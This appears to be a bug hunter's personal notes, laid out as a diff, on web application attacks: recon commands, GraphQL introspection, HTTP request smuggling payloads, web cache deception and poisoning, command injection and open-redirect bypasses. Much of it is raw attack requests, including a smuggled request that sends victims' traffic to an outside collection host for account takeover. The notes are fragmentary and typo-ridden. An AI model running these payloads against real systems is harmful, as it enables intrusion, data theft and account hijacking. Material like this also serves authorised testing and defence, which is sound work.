+$ cat subdomains.txt | httprobe | anew webs.txt
+
+# Enumerating the Status Code, Technology Stack and Title of each subdomain
+$ cat subdomains.txt | httpx -sc -title -td | anew httpx.txt
+
+each subdomain
+
+echo www.redacted.gap.com | httpx -sc -title -td -web-server
+
+ffuf -u https://notes.readcted.com/FUZZ -w ~/wordlists/domino.txt -mc 200 -fw 1
+
+  TIP
+  Always FUZZ based on the technology stack and always dig deep, say you found /admin — 403, then try fuzzing for https://example.com/admin/FUZZ URL to check if any other endpoint accessible without admin login
+       
+       
+       
+       https://yourtarget[.]com/auth/realms/master/clients-registrations/default/security-admin-console
+
+Scan your targets using the following command and ethically report any quick wins:
+
+nuclei -l targets.txt -t CVE-2020-27838.yaml
+
+Here's the link to the template - https://github.com/projectdiscovery/nuclei-templates/blob/4d6274fcd433d84a4ef7681cda6ad8e93a6448af/http/cves/2020/CVE-2020-27838.yaml#L2
+       
+           
+           
+           How to perform introspection in GraphQL
+           Send a POST request with the below body.
+           
+           {"query": "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
+
+    extract the JSON response in a file. once you have the schema, the best way is to import it into a tool like “GraphQL Voyager
+           
+           
+           HTTP REQUEST SMUGGLING      HTTP REQUEST SMUGGLING         HTTP REQUEST SMUGGLING
+           https://github.com/anshumanpattnaik/http-request-smuggling
+           methodology      https://medium.com/@rcxsecurity/http-request-smuggling-wwwwwh-85be9c46a38e
+    this occurs when the front end processes the Content-Length header, and the back end processes the Transfer-Encoding header
+ 1)          CL.TE   
+       test case
+ POST / HTTP/1.1
+Host: cyberseccafe.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+F
+X        
+ 
+ this request will trigger a noticeable time delay in the response because it sends a chunked request with a hanging byte on the end if the vulnerability is present
+ NOTE-- Tip: I’d recommend pasting this request in your BurpSuite and highlighting the body to understand where the Content-Length cuts off. Since the length is 4, it will leave the X hanging.
+
+We can send a basic request like the following to fully confirm the vulnerabiliTY
+ 
+ POST /search HTTP/1.1
+Host: cyberseccafe.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+Transfer-Encoding: chunked
+
+ff
+q=smuggler&z=
+0
+
+GET /404 HTTP/1.1
+Foo: z
+
+
+ So, if this vulnerability is present, sending a second request after the first will return a 404 error — confirming a CL.TE request smuggling vulnerability is present.
+           
+2)   TE.CL   
+ The front end interprets the Transfer-Encoding header, and the back end uses the Content-Length   
+ 
+POST / HTTP/1.1
+Host: cyberseccafe.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+
+ If you send the same request again, it should attempt an XPOST method, appending the hanging chunk to the beginning of the following request.
+Once observed, you can send the following POC to confirm the found vulnerability:          
+     
+  POST /feature HTTP/1.1
+Host: cyberseccafe.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+8f
+GET /404 HTTP/1.1
+Host: cyberseccafe.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 130
+z=
+0      
+
+3) TE.TE
+ The last example of a Request Smuggling attack is when both front end and back end support the Transfer-Encoding header. As an attacker, you can use obfuscation of the TE header to attempt to induce either the front end or back end to not process it. You can then smuggle in a second request like shown above.
+ 
+ 
+ Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding:[tab]chunked
+[space]Transfer-Encoding: chunked
+X: X[\n]Transfer-Encoding: chunked
+Transfer-Encoding
+: chunked
+
+
+           
+           
+           1.Using HTTP Request Smuggling Burp Extension either burp community or pro. you can widen your scope by adding more subdomains and URLs select them all and from the extension tab click smuggle probe.
+
+‌2. Using smuggler.py tool which is a command line tool that replicate almost the same work of burp extension.
+
+# Single Host:
+python3 smuggler.py -u <URL>
+
+# List of hosts:
+cat list_of_hosts.txt | python3 smuggler.py
+‌Note: These scanner will not guarantee the existing of vulnerability, there are false positives so you need to validate every finding of any of these tools. ‌
+    FINDINGS
+    
+    run burp extension scanner on all the subdomain   and check for the response
+    validate findings by sending some chunked data
+    POST / HTTP/1.1 
+Host: subdoamin.readcted.com
+Upgrade-Insecure-Requests: 1 
+Content-Type: application/x-www-form-urlencoded 
+Content-Length: 7 
+Transfer-Encoding: chunked 
+Transfer-encoding: identity
+
+
+1
+A
+0
+
+  To exploit HTTP Request Smuggling Vulnerability you have to use turbo intruder to be able to send concurrent request and to receive the smuggled one before it reach the user. we will send the following request:
+
+POST / HTTP/1.1
+Host: redacted.com
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+Transfer-Encoding: chunked
+Transfer-encoding: identity
+
+0
+
+GET /video HTTP/1.1
+Foo: x
+
+    Escalating to Full Account takeover
+Now let’s craft our request that will be smuggled to send our malicious one. I will request bin to receive users traffic into my endpoint. the payload shall looks like the following: ‌
+
+POST / HTTP/1.1
+Host: redacted.com
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 91
+Transfer-Encoding: chunked
+Transfer-encoding: identity
+
+0
+
+GET /video HTTP/1.1
+Host: enfliy4kmrr8i.x.pipedream.net
+Foo: x
+    
+           
+           
+           dump two request at a time  change the http/2 tp http/1 , and focus on  the second request that no user agent is involved 
+            example 
+             GET /test?a=a% HTTP/1.1
+            Host: admin.target.com
+         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+ 
+           GET /admin/login HTTP/1.1
+            Host: admin.target.com
+
+           
+          Host: admin.target.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+
+GET /admin/login HTTP/1.1
+Host: admin.target.com Cache possioning       
+
+
+
+     tip  
+     For this particular HHI case, it is only exploitable by adding a letter /a as a GET parameter (I tried with other letters, and only this one worked -weird-), allowing the redirection of the domain *****.net to evil.com.
+   GET /a  http 1/1
+   host: eveil.com
+   
+   
+   verification 
+   Request
+   POST /  http1/1
+   host: victiom.com
+   transfer encoding : chunked
+   content-leghth : 51
+   6
+   DESYNC
+   0
+   
+     GET /a  http 1/1
+   host: eveil.com
+   
+    the above request gave out the responses
+    
+    while exploring the above request, run a noumber of request like the example below
+       POST /  http1/1
+   host: victiom.com
+   transfer encoding : chunked
+   content-leghth : 51
+   6
+   DESYNC
+   0
+   
+     GET /a  http 1/1
+   host: a: 11111111111
+   
+   11 characteres 1 = 65535
+   10 characteres 1 = 13767
+    
+    
+    tip tip
+    write a  dynamic header rewrite rule with a specific value: concat("-", "\x0d\x0aTransfer-Encoding: chunked")
+    In combination with a POST body that was carefully crafted to include elements like 0\r\n\r\nGET / HTTP/1.1\r\nHost: internal.example.com\r\n\r\n, I succeeded in making HTTP request smuggling appear remarkably straightforward.
+   
+   
+      
+
+
+
+
+
+                                                   
+                                                   Web Cache deception       Web Cache deception
+                                                         check this 
+           https://medium.com/@hbenja47/how-do-i-search-for-web-cache-deception-6c5f318016ca
+           https://x.com/0xRAYAN7/status/1804963882676465674
+           https://www.linkedin.com/pulse/cache-deception-attacks-pentesters-secret-weapon-how-defend-bise--f4p2e/
+           
+           
+           
+                                                   
+                                                   
+                                                   
+                                                   
+           tip
+     The easiest way to find a max-impact desync vulnerability in 2024:
+     https://t.co/Movn1BiqmR
+     https://x.com/albinowax/status/1755507629940457959
+
+1. Create a novel desync technique
+2. Add it to a tool like HTTP Request Smuggler
+3. Scan a bunch of systems and see what sticks. 
+The only tricky step is #1 and there's a new tool to help with this 1/2
+  check this tool  on of novel techniques - check out the docs and presentation!
+  https://t.co/Movn1BiqmR
+                                        
+                                        
+                                        
+            tip     tip  
+            subdomain.target.com  on su.txt                                                 https://medium.com/@mohamed0xmuslim/3-easy-cash-via-cache-99d600565ac5
+            create an account
+            check  if   https://subdomain.target.com/gb/account/ endpoint have an object called window.current_user which retrieve user sensitive info like user_id, email, phone, etc
+           check to   See if   the header Cf-cache-status: Dynamic             this  means that Cloudflare did not consider the URL to be eligible for caching
+            add /test.css so https://subdomain.target.com/gb/account/test.css   and check/notice  that you got “Page not found” page not found but the Cf-cache-status changed from DYNAMIC to MISS
+             look at the “Page not found” page source code and notice that window.current_user object still exist and have all user info
+              Open the url https://subdomain.target.com/gb/account/test.css from different browser and make sure that the data still exist
+                                                   
+                                                   
+                                                   
+           we manage to force the Load Balancer into caching our request on a specific crafted path of ours, we will be able to read our victim's sensitive data from the cached response.It wasn't straight-forward in this case
+           
+  NOTE  :     Relaxed cache rules can be very dangerous, especially with URL parser confusions.  In a website that uses caching, the request must go through the CDN before it gets the the web server. This means that the URL gets parsed twice, which makes it possible for a URL parser confusion
+           
+  allows check for this endpoint share/%2F..%2Fapi/auth/session?cachebuster=123   
+           
+   ****
+   first thing is to try is to fetch the resource with a file extension appended to the endpoint 
+   example
+   api/auth/session/test.css
+   /api/auth/session.css
+   /notifications/logo.png 
+   /stylesheet.css 
+   
+   Conditions
+So basically, two conditions are required for this vulnerability to exist:
+Web cache functionality is set for the web application to cache files by their extensions, disregarding any caching header.
+When accessing a page like http://www.example.com/home.php/non-existent.css, the web server will return the content of "home.php" for that URL.
+   
+      Mitigation
+Configure the cache mechanism to cache files only if their HTTP caching headers allow. That will solve the root cause of this issue.
+If the cache component provides the option, configure it to cache files by their content type.
+Configure the web server so that for pages such as http://www.example.com/home.php/non-existent.css, the web server doesn’t return the content of "home.php" with this URL. Instead, for example, the server should respond with a 404 or 302 response.
+
+
+   tip
+   Guess everything using Param Miner extension.
+   check for unkeyed header in the request  of param miner
+    added the `X-Forwarded-Host: example.com`  in burp repeter , host header in the first request and checked the response.
+   the original host will be over written with example.com
+   open the url in the private browser and check if The example.com was still showing in the response  and then excalte to xss or html injection
+   
+   below is the html injection
+   GET /blog?abcde=234 HTTP/2
+Host: www.test.com
+User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
+X-Forwarded-Host: test.com"><h1>themarkib0x0
+Accept-Encoding: gzip, deflate, br
+Content-Length: 2
+        
+        
+        
+                   
+           tip tip           https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9
+                              https://infosecwriteups.com/a-web-cache-deception-chained-to-a-csrf-the-recipe-9e9a5b5f53aa
+                              https://medium.com/@hbenja47/my-first-two-valid-and-rewarded-web-cache-deceptions-earning-2250-c8d2a6968713
+                              
+           If the application does not have a login functionality, but using Akamai CDN, these are my steps: Send the first request to Repeater
+           Check if the server is caching normal requests (you can tell this by the response header “Server-Timing: cdn-cache; desc=HIT”)
+           Add an Illegal Request Header into the request
+           
+           Request:
+GET /products/xxx/xxxx/xxx/?test HTTP/2
+Host: www.host.com
+\: 
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Upgrade-Insecure-Requests: 1
+Te: trailers
+
+    response
+HTTP/2 400 Bad Request
+Content-Type: text/html;charset=iso-8859-1
+Content-Length: 70
+Cache-Control: max-age=297
+Expires: Thu, 21 Jul 2022 16:17:54 GMT
+Date: Thu, 21 Jul 2022 16:12:57 GMT
+Server-Timing: cdn-cache; desc=HIT
+Server-Timing: edge; dur=32
+Server-Timing: origin; dur=147
+Strict-Transport-Security: max-age=86400
+Ak-Uuid: 0.bc85d817.1658419977.1592c61
+     ****   ***
+     If the Application does have a Login Functionality
+           Create an account Check if any sensitive information is disclosed in any page (e.g Session Token   
+           Send the request to Repeater Add a Cacheable Extension (.js , .css) at the end of the URL and see if it gives a 200 OK Response        
+           
+
+           
+           
+           
+        
+           
+           
+           
+     
+           
+           
+           
+       
+
+ 
+
+
+
+      COMMAND INJECTION                                COMMAND INJECTION                                           COMMAND INJECTION
+      https://portswigger.net/web-security/os-command-injection
+      https://medium.com/@dhruvsingh0203/hola-hackers-im-dhruv-singh-a-cybersecurity-enthusiast-passionate-about-exploring-the-depths-834a9d140115
+      
+        OS Command Injection is a type of vulnerability where an attacker can execute arbitrary commands on a host operating system through a vulnerable application
+        
+        
+        tip    in any user input , check for os command injection
+        ping -n 11 127.0.0.1||ping -c 11 127.0.0.1
+
+
+   testing with payloads
+   <request>
+  <a_name>John Doe</a_name>
+  <a_MobileNumber>1234567890</a_MobileNumber>
+  <a_EMAILID>johndoe@example.com</a_EMAILID>
+  <a_AdhaarNumber>1234567890123</a_AdhaarNumber>
+  <a_Country>India</a_Country>
+</request>
+       
+            to   this below
+            
+            <request>
+  <a_name>John Doe</a_name>
+  <a_MobileNumber>1234567890</a_MobileNumber>
+  <a_EMAILID>johndoe@example.com</a_EMAILID>
+  <a_AdhaarNumber>|ping -n 11 127.0.0.1||ping -c 11 127.0.0.1</a_AdhaarNumber>
+  <a_Country>India</a_Country>
+</request>
+   check for delay,  the delay suggest that the command was being executed on the server, confirming the vulnerability
+
+
+   OPEN REDIRECT      OPEN REDIRECT      0PEN REDIRECT
+   https://infosecwriteups.com/story-of-a-1000-open-redirect-1405fb8a0e7a
+   
+     
+   
+   
+   check
+   https://github.com/r0075h3ll/Oralyzer                             //     try crlf redirection bypass with this tool 
+                         check my javascript_alert_redirct   for payload to byppass oprn redirect   to achieve full ATO
+        
+        tip
+        You can bypass whitelist filter in openredirect by this way:
+https://freevisit.ru/redirect/?g=https://ⓦⓦⓦ.ⓕⓑⓘ.ⓖⓞⓥ
+        
+   
+
+is also possible to use meta tags to redirect the users to another site:
+&lt;meta http-equiv="Refresh" content="0; url=http://www.newsite.com/" > And finally, for redirections using JavaScript, we can use different functions to do that; here are the main functions for doing so:
+
+window.open('http://www.testsite.com') location.replace('http://www.testsite.com') location.assign('http://www.testsite.com') location.href='http://www.testsite.com'
+location='http://www.testsite.com'
+location.port='8080'
+document.URL() URL
+   
+   
+   Ssrf with open redirect 
+
+Go to burp site map,  filter it with only open riderct
+
+Then check for redirect that leads to ssrf
+   
+
+
+Open redirects are not complex to exploit. Once you confirm the vulnerability, you will just have to insert the destination into the request. The following are the most common redirections that you could insert in an open redirect vulnerability:
+/%09/testsite.com /%5ctestsite.com //www.testsite.com/%2f%2e%2e //www.testsite.com/%2e%2e //testsite.com/
+//testsite.com/%2f..
+//\testsite.com /\victim.com:80%40testsite.com I also recommend you exploit the following parameters; just inject the destination in the target value:
+?url=http://{target} ?url=https://{target} ?next=http://{target} ?next=https://{target} ?url=https://{target} ?url=http://{target} ?url=//{target} ?url=$2f%2f{target} ?next=//{target} ?next=$2f%2f{target} ?url=//{target} ?url=$2f%2f{target} ?url=//{target} /redirect/{target} /cgi-bin/redirect.cgi?{target} /out/{target} /out?{target}
+
+
+/out?/{target} /out?//{target} /out?/\{target} /out?///{target} ?view={target} ?view=/{target} ?view=//{target} ?view=/\{target} ?view=///{target} /login?to={target} /login?to=/{target} /login?to=//{target} /login?to=/\{target} /login?to=///{target}
+   
+   
+   few things i do when i get an open 
+   (1) i spray that parameter to other endpoint of the web application.
+(2) I always look into wayback machine for old urls to see if it have same or similar parameter.
+(3) Google dorks to see if i can get the same parameter in another endpoint.
+
+  tip tip  tip  tip
+  First if the Applictaion have a user sign-In/Sign-Up feature,then register a user and log in as the user.
+
+Go to your user profile page, for example: testvuln.com/accounts/profile
+2. Copy the profile page's URL
+
+3. Logout and Clear all the cookies and go to the homepage of the site.
+
+4. Paste the Copied Profile URL on the address bar
+
+5. If the site prompts for a login,check the address bar,you may find the login page with a redirect parameter like the following:
+
+https://testvuln.com/login?next=/accounts/profile
+
+https://testvuln.com/login?returnUrl=/accounts/profile
+
+2. How To Bypass
+Use `@`
+https://testvuln.com/login?next=https://vuln.me@evit.com
+
+- due to bad regex
+
+Use url encoded
+https://testvuln.com/login?next=http://evil%E3%80%82com
+
+- By using the character.(%E3%80%82 url encoded)instead of a normal dot in urls,it is possible to bypass the blocking.
+
+3. Try to leverage it to Xss
+https://testvuln.com/login?next=javascript:alert(1);//
+   
+   
+   
+   Open redirect 
+   
+   cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect/
+
+domain_name=, or checkout_url=
+
+Check for it in JavaScript files and hyml 
+
+<meta http-equiv=“refresh” content=“0; url=https://www.google.com/”>
+
+
+window.location = https://www.google.com/  window.location.href = https://www.google.com  window.location.replace(https://www.google.com)
+
+When you’re searching for open redirect vulnerabilities, you’ll usually be monitoring your proxy history for a GET request sent to the site you’re testing that includes a parameter specifying a URL redirect
+   
 
 
 
